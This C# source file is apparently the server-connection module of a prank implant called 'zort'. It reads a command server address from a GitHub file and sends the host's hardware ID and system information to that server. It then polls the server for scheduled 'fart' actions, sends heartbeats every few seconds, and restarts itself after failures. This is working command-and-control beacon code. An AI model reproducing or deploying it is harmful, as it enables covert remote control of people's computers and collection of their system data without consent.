using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using zort.Properties;

namespace zort
{
    public class ServerCon : IPayloadModule
    {
        private const string DEFAULT_SERVER_URL = "localhost:2256";
        private readonly Thread ServerThread = new Thread(ServerRoutine);

        public ElevationType ElevationType => ElevationType.Both;

        public string ModuleName => "ServerConnection";

        public void Start()
        {
            ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            ServerThread.Start();
        }

        public void Stop()
        {
            if (ServerThread.IsAlive)
            {
                ServerThread.Abort();
            }
        }
        private static async void ServerRoutine()
        {
            try
            {
                List<Zort.FartSchedule> FartsAccountedFor = new List<Zort.FartSchedule>();
                //send data to /log endpoint on startup
                //fetch /heartbeat endpoint every 5 seconds

                string HWID = SysInfoHelper.HWID();
                SystemInfo info = SysInfoHelper.Get();

                //get server url from github
                const string GITHUB_URL = "https://raw.githubusercontent.com/ZKitap/zortie/refs/heads/main/server.dat";
                string SERVER_URL = DEFAULT_SERVER_URL;
                var handler = new HttpClientHandler
                {
                    ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) =>
                    {
                        // Load the known, trusted certificate
                        var trustedCert = new X509Certificate2(Resources.cert);
                        // Also trust certs from trusted CA's
                        if (sslPolicyErrors == SslPolicyErrors.None) return true;
                        // Compare the server's certificate with the trusted certificate
                        return cert.Equals(trustedCert); 
                    }
                };
                using (HttpClient client = new HttpClient(handler))
                {
                    try
                    {
                        var res = await client.GetAsync(GITHUB_URL);
                        if (res.IsSuccessStatusCode)
                        {
                            var serverUrl = await res.Content.ReadAsStringAsync();
                            SERVER_URL = serverUrl.Trim();
                        }
                        else
                        {
                            ModuleLogger.Log(typeof(ServerCon), "Failed to fetch server URL from GitHub.");
                        }
                    }
                    catch (Exception ex)
                    {
                        ModuleLogger.Log(typeof(ServerCon), $"Error fetching server URL from GitHub: {ex.Message}");
                    }

                sendSysData:
                    var response = await SendRequestAsync(SERVER_URL, "/log", new { hwid = HWID, sysdata = JsonConvert.SerializeObject(info) }, client);
                    if (response == null)
                    {
                        ModuleLogger.Log(typeof(ServerCon), "Failed to send system info. Retrying in 5 seconds...");
                        await Task.Delay(5000);
                        goto sendSysData;
                    }
                    if (response.IsSuccessStatusCode)
                    {
                        ModuleLogger.Log(typeof(ServerCon), "System info sent successfully.");
                    }
                    else
                    {
                        ModuleLogger.Log(typeof(ServerCon), "Failed to send system info. Retrying in 5 seconds...");
                        await Task.Delay(5000);
                        goto sendSysData;
                    }

                getScheduledFarts:
                    response.Dispose();
                    response = await SendRequestAsync(SERVER_URL, "/getFarts", new { hwid = HWID }, client);
                    if (response == null)
                    {
                        ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts.");
                        return;
                    }
                    if (!response.IsSuccessStatusCode)
                    {
                        ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts.");
                    }
                    else

                        try
                        {

                            var jsonResponse = await response.Content.ReadAsStringAsync();
                            List<Zort.FartSchedule> scheduledFarts = new List<Zort.FartSchedule>();
                            dynamic jObj = JsonConvert.DeserializeObject(jsonResponse);
                            if (jObj == null || jObj.farts == null)
                            {
                                ModuleLogger.Log(typeof(ServerCon), "No scheduled farts found.");
                                goto sendHeartbeat;
                            }

                            for (int i = 0; i < jObj.farts.Count; i++)
                            {
                                var fartSchedule = new Zort.FartSchedule
                                {
                                    Type = (Zort.FartType)Enum.Parse(typeof(Zort.FartType), ((string)jObj.farts[i].type), true),
                                    Timestamp = DateTimeOffset.FromUnixTimeSeconds((long)jObj.farts[i].timestamp).UtcDateTime
                                };
                                scheduledFarts.Add(fartSchedule);
                            }

                            foreach (var fartSchedule in scheduledFarts)
                            {
                                // Check if the fart is already scheduled
                                if (FartsAccountedFor.Exists(f => f.Timestamp == fartSchedule.Timestamp && f.Type == fartSchedule.Type)) continue;
                                else
                                {
                                    Zort.ScheduledFart(fartSchedule);
                                    FartsAccountedFor.Add(fartSchedule);
                                }
                            }
                        }
                        catch (JsonException ex)
                        {
                            ModuleLogger.Log(typeof(ServerCon), $"Failed to parse scheduled farts: {ex.Message}");
                        }

                    sendHeartbeat:
                    await SendRequestAsync(SERVER_URL, "/heartbeat", new { hwid = HWID }, client);
                    await Task.Delay(2500);
                    goto getScheduledFarts;
                }
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(typeof(ServerCon), $"Error in server routine: {ex.Message}");
                // restart the server routine after 5 seconds
                Thread.Sleep(5000);
                ServerRoutine();
            }
        }


        static async Task<HttpResponseMessage> SendRequestAsync(string url, string endpoint, dynamic data, HttpClient client)
        {
            try
            {
                // Construct the URL with query parameters from the data object
                var requestUrl = $"https://{url}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
                foreach (var property in data.GetType().GetProperties())
                {
                    requestUrl += $"{property.Name}={property.GetValue(data)}&";
                }
                requestUrl = requestUrl.TrimEnd('&');

                // Send the POST request
                HttpResponseMessage response = await client.GetAsync(requestUrl);
                return response;
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine($"Request error: {ex.Message}");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return null;
            }
        }
    }
}
